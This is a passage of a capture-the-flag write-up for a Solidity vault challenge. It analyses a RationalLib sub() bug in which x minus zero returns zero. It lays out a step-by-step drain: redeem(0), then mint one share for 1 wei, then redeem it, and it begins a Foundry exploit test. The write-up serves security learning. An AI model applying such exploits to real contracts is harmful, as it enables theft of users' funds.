</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span>uint256 yNumerator</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>y</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>xNumerator </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span> </span><span class="token" style="color:#d4d4d4">&amp;&amp;</span><span> yNumerator </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">unwrap</span><span class="token" style="color:#d4d4d4">(</span><span>x</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">unwrap</span><span class="token" style="color:#d4d4d4">(</span><span>y</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">neq</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> x</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> y</span><span class="token" style="color:#d4d4d4">)</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#d4d4d4">!</span><span class="token" style="color:#dcdcaa">eq</span><span class="token" style="color:#d4d4d4">(</span><span>x</span><span class="token" style="color:#d4d4d4">,</span><span> y</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#6a9955">// ======================================== HELPERS ========================================</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#9cdcfe"> v</span><span class="token" style="color:#d4d4d4">)</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256 numerator</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> uint256 denominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    numerator </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">unwrap</span><span class="token" style="color:#d4d4d4">(</span><span>v</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">&gt;&gt;</span><span> </span><span class="token" style="color:#b5cea8">128</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    denominator </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">unwrap</span><span class="token" style="color:#d4d4d4">(</span><span>v</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">&amp;</span><span> </span><span class="token" style="color:#dcdcaa">type</span><span class="token" style="color:#d4d4d4">(</span><span>uint128</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">max</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">toRational</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256 numerator</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> uint256 denominator</span><span class="token" style="color:#d4d4d4">)</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>numerator </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#4ec9b0">RationalLib</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#9cdcfe">ZERO</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    uint256 d </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">gcd</span><span class="token" style="color:#d4d4d4">(</span><span>numerator</span><span class="token" style="color:#d4d4d4">,</span><span> denominator</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    numerator </span><span class="token" style="color:#d4d4d4">/=</span><span> d</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    denominator </span><span class="token" style="color:#d4d4d4">/=</span><span> d</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>numerator </span><span class="token" style="color:#d4d4d4">&lt;=</span><span> </span><span class="token" style="color:#dcdcaa">type</span><span class="token" style="color:#d4d4d4">(</span><span>uint128</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">max</span><span> </span><span class="token" style="color:#d4d4d4">&amp;&amp;</span><span> denominator </span><span class="token" style="color:#d4d4d4">&lt;=</span><span> </span><span class="token" style="color:#dcdcaa">type</span><span class="token" style="color:#d4d4d4">(</span><span>uint128</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">max</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Overflow&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#4ec9b0">Rational</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">wrap</span><span class="token" style="color:#d4d4d4">(</span><span>numerator </span><span class="token" style="color:#d4d4d4">&lt;&lt;</span><span> </span><span class="token" style="color:#b5cea8">128</span><span> </span><span class="token" style="color:#d4d4d4">|</span><span> denominator</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">gcd</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256 x</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> uint256 y</span><span class="token" style="color:#d4d4d4">)</span><span> pure </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#c586c0">while</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>y </span><span class="token" style="color:#d4d4d4">!=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        uint256 t </span><span class="token" style="color:#d4d4d4">=</span><span> y</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        y </span><span class="token" style="color:#d4d4d4">=</span><span> x </span><span class="token" style="color:#d4d4d4">%</span><span> y</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        x </span><span class="token" style="color:#d4d4d4">=</span><span> t</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#c586c0">return</span><span> x</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p>This library implements fractional numbers as a custom type:</p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>type Rational </span><span class="token" style="color:#569CD6">is</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span class="token" style="color:#d4d4d4">;</span></code></div></pre>
<p><strong>Encoding Scheme:</strong></p>
<pre><code>|   Upper 128 bits   |   Lower 128 bits   |
|     Numerator      |    Denominator     |
</code></pre>
<p><strong>Key Functions:</strong></p>
<ul>
<li><code>toRational()</code> - Encodes numerator/denominator into packed uint256</li>
<li><code>fromRational()</code> - Extracts numerator and denominator from packed value</li>
<li>Arithmetic operations: <code>add()</code>, <code>sub()</code>, <code>mul()</code>, <code>div()</code></li>
</ul>
<h2>Vulnerability Analysis</h2>
<h3>The Critical Bug</h3>
<p>The vulnerability lies in the <code>sub()</code> function of RationalLib:</p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>
</span><span></span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">sub</span><span class="token" style="color:#d4d4d4">(</span><span>Rational x</span><span class="token" style="color:#d4d4d4">,</span><span> Rational y</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">pure</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>Rational</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span> xNumerator</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> xDenominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>x</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span> yNumerator</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint256</span><span> yDenominator</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">fromRational</span><span class="token" style="color:#d4d4d4">(</span><span>y</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>yNumerator </span><span class="token" style="color:#d4d4d4">!=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>xNumerator </span><span class="token" style="color:#d4d4d4">!=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Underflow&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#6a9955">// (a / b) - (c / d) = (ad - cb) / bd</span><span>
</span><span>    </span><span class="token" style="color:#6a9955">// a / b &gt;= c / d implies ad &gt;= cb, so the subtraction will never underflow when x &gt;= y</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint256</span><span> numerator </span><span class="token" style="color:#d4d4d4">=</span><span> xNumerator </span><span class="token" style="color:#d4d4d4">*</span><span> yDenominator </span><span class="token" style="color:#d4d4d4">-</span><span> yNumerator </span><span class="token" style="color:#d4d4d4">*</span><span> xDenominator</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint256</span><span> denominator </span><span class="token" style="color:#d4d4d4">=</span><span> xDenominator </span><span class="token" style="color:#d4d4d4">*</span><span> yDenominator</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#dcdcaa">toRational</span><span class="token" style="color:#d4d4d4">(</span><span>numerator</span><span class="token" style="color:#d4d4d4">,</span><span> denominator</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>The Issue:</strong>
When subtracting zero (<code>yNumerator == 0, yDenominator == 0</code>) from any rational number <code>x</code>:</p>
<ul>
<li>The underflow check is bypassed</li>
<li>Calculation becomes: <code>numerator = xNumerator * 0 - 0 * xDenominator = 0</code>, <code>denominator = xDenominator * 0 = 0</code></li>
<li><code>toRational(0, 0)</code> returns the canonical ZERO rational</li>
<li><strong>Result: <code>x - 0 = 0</code> instead of <code>x</code></strong></li>
</ul>
<p>This breaks the fundamental mathematical property that <code>x - 0 = x</code>.</p>
<h2>Exploitation Vector</h2>
<p>The vault&#x27;s <code>redeem()</code> and <code>withdraw()</code> functions both perform:</p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>totalShares </span><span class="token" style="color:#d4d4d4">=</span><span> totalShares </span><span class="token" style="color:#d4d4d4">-</span><span> _shares</span><span class="token" style="color:#d4d4d4">;</span></code></div></pre>
<p>By calling <code>redeem(0)</code> or <code>withdraw(0)</code>, we can trigger the bug where <code>totalShares - ZERO = ZERO</code>.</p>
<h2>Exploitation Strategy</h2>
<h3>Step-by-Step Attack</h3>
<ol>
<li>
<p><strong>Initial Setup</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>setup</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">claim</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// Receive 1000 GREY tokens</span></code></div></pre>
</li>
<li>
<p><strong>Trigger the Vulnerability</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>vault</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">redeem</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// totalShares becomes ZERO due to bug</span></code></div></pre>
<p>After this call:</p>
<ul>
<li>Vault&#x27;s <code>totalShares</code> = 0 (should be 5000e18)</li>
<li>Vault&#x27;s asset balance = 5000e18 GREY (unchanged)</li>
</ul>
</li>
<li>
<p><strong>Re-bootstrap with Minimal Investment</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>vault</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">mint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// Mint 1 share for 1 wei</span></code></div></pre>
<p>Since <code>totalShares == 0</code>, the conversion rate is 1:1:</p>
<ul>
<li>Cost: 1 wei GREY</li>
<li>Received: 1 share</li>
<li>New state: <code>totalShares = 1</code>, vault balance = 5000e18 + 1 wei</li>
</ul>
</li>
<li>
<p><strong>Drain the Vault</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>vault</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">redeem</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// Redeem our single share</span></code></div></pre>
<p>Conversion calculation:</p>
<pre><code>assets = shares Ã— totalAssets / totalShares
assets = 1 Ã— (5000e18 + 1) / 1 = 5000e18 + 1 wei
</code></pre>
</li>
<li>
<p><strong>Final State</strong></p>
<ul>
<li>Started with: 1000e18 GREY</li>
<li>Spent: 1 wei GREY</li>
<li>Received: 5000e18 + 1 wei GREY</li>
<li><strong>Total: 6000e18 GREY</strong></li>
</ul>
</li>
</ol>
<h2>Solution</h2>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-javascript" style="white-space:pre;color:#9cdcfe;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span>pragma solidity </span><span class="token" style="color:#d4d4d4">^</span><span class="token" style="color:#b5cea8">0.8</span><span class="token" style="color:#b5cea8">.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#c586c0">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#9cdcfe">Test</span><span class="token" style="color:#d4d4d4">,</span><span class="token"> console</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#c586c0">from</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Test.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#c586c0">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#9cdcfe">Setup</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#c586c0">from</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/rational_challenge/Setup.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>contract </span><span class="token" style="color:#4ec9b0">RationalSolution</span><span> is </span><span class="token" style="color:#4ec9b0">Test</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#4ec9b0">Setup</span><span> </span><span class="token" style="color:#569CD6">public</span><span> setupp</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    address </span><span class="token" style="color:#569CD6">public</span><span> attacker </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">makeAddr</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;attacker&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setUp</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        setupp </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Setup</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">testExploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">//first we are claiming our 1000 GREY given by the setup contract</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">startPrank</span><span class="token" style="color:#d4d4d4">(</span><span>attacker</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">claim</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;balance of attacker before redeeming&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> setupp</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">vault</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">asset</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>attacker</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">/</span><span> </span><span class="token" style="color:#b5cea8">1e18</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
